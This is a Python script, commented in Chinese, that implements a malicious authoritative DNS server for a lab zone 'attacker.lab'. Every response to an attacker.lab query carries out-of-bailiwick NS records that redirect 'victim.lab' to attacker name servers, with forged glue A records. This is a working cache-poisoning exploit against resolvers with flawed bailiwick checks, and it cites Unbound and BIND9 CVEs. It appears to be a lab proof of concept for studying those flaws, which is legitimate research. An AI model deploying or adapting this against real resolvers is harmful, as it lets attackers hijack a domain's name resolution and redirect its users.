#!/usr/bin/env python3
"""
恶意权威服务器 — attacker.lab 区

作为 attacker.lab 的"合法"权威服务器运行。
当收到 *.attacker.lab 的 A 查询时，返回：
  - Answer:     合法的 A 记录
  - Authority:  out-of-bailiwick 的恶意 NS 记录 (victim.lab → ns1.evil.attacker.lab)
  - Additional: 恶意 glue A 记录

所有标准验证检查（TXID、源地址、Question）均会通过，
唯一的安全防线是解析器的 bailiwick check。

参考: CVE-2025-11411 (Unbound), CVE-2021-25220 (BIND9)
"""

import argparse
import socket
import sys
import time

import dns.flags
import dns.message
import dns.name
import dns.rcode
import dns.rdata
import dns.rdataclass
import dns.rdatatype


VICTIM_DOMAIN = "victim.lab."
EVIL_NS1 = "ns1.evil.attacker.lab."
EVIL_NS2 = "ns2.evil.attacker.lab."
EVIL_GLUE_IP = "172.21.0.99"

ANSWER_MAP = {
    "test.attacker.lab.": "6.6.6.7",
    "www.attacker.lab.":  "6.6.6.6",
    "trigger.attacker.lab.": "6.6.6.8",
}
DEFAULT_ANSWER_IP = "6.6.6.9"


def build_malicious_response(query_wire: bytes) -> bytes:
    """构造包含 out-of-bailiwick Authority NS 的恶意响应"""
    query = dns.message.from_wire(query_wire)
    qname = query.question[0].name
    qtype = query.question[0].rdtype
    qname_str = str(qname).lower()

    if not qname_str.endswith("attacker.lab."):
        resp = dns.message.make_response(query)
        resp.set_rcode(dns.rcode.REFUSED)
        return resp.to_wire()

    resp = dns.message.make_response(query)
    resp.flags |= dns.flags.AA | dns.flags.QR

    # --- Answer 段：合法的 A 记录 ---
    if qtype == dns.rdatatype.A:
        answer_ip = ANSWER_MAP.get(qname_str, DEFAULT_ANSWER_IP)
        rrset = resp.find_rrset(
            resp.answer, qname, dns.rdataclass.IN, dns.rdatatype.A, create=True
        )
        rrset.update_ttl(86400)
        rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, answer_ip))

    # --- Authority 段：恶意 out-of-bailiwick NS ---
    # victim.lab 不属于 attacker.lab 域，这是攻击的核心
    victim_name = dns.name.from_text(VICTIM_DOMAIN)
    ns_rrset = resp.find_rrset(
        resp.authority, victim_name, dns.rdataclass.IN, dns.rdatatype.NS, create=True
    )
    ns_rrset.update_ttl(86400)
    ns_rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.NS, EVIL_NS1))
    ns_rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.NS, EVIL_NS2))

    # --- Additional 段：恶意 glue A 记录 ---
    for ns_name_str in (EVIL_NS1, EVIL_NS2):
        ns_name = dns.name.from_text(ns_name_str)
        glue = resp.find_rrset(
            resp.additional, ns_name, dns.rdataclass.IN, dns.rdatatype.A, create=True
        )
        glue.update_ttl(86400)
        glue.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, EVIL_GLUE_IP))

    return resp.to_wire()


def main():
    parser = argparse.ArgumentParser(description="恶意 attacker.lab 权威服务器")
    parser.add_argument("--port", type=int, default=9953, help="监听端口 (默认 9953)")
    parser.add_argument("--bind", default="0.0.0.0", help="监听地址 (默认 0.0.0.0)")
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.bind, args.port))

    print(f"[恶意权威服务器] 监听 {args.bind}:{args.port}")
    print(f"[恶意权威服务器] 对 *.attacker.lab 查询返回:")
    print(f"  Answer:     合法 A 记录")
    print(f"  Authority:  {VICTIM_DOMAIN} NS {EVIL_NS1}")
    print(f"              {VICTIM_DOMAIN} NS {EVIL_NS2}")
    print(f"  Additional: {EVIL_NS1} A {EVIL_GLUE_IP}")
    print(f"              {EVIL_NS2} A {EVIL_GLUE_IP}")
    print(f"[恶意权威服务器] 等待查询...\n")

    try:
        while True:
            data, addr = sock.recvfrom(4096)
            try:
                query = dns.message.from_wire(data)
                qname = query.question[0].name
                qtype_str = dns.rdatatype.to_text(query.question[0].rdtype)
                ts = time.strftime("%H:%M:%S")

                resp_wire = build_malicious_response(data)
                sock.sendto(resp_wire, addr)

                resp = dns.message.from_wire(resp_wire)
                rcode_str = dns.rcode.to_text(resp.rcode())

                print(f"[{ts}] 查询来自 {addr[0]}:{addr[1]} → {qname} {qtype_str}")
                print(f"  TXID={query.id}, 响应={rcode_str}")
                for tag, section in [("ANS", resp.answer), ("AUTH", resp.authority), ("ADD", resp.additional)]:
                    for rrset in section:
                        print(f"  {tag}: {rrset.to_text()}")
                print()
            except Exception as e:
                print(f"[ERROR] {e}")
    except KeyboardInterrupt:
        print("\n[恶意权威服务器] 已停止")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
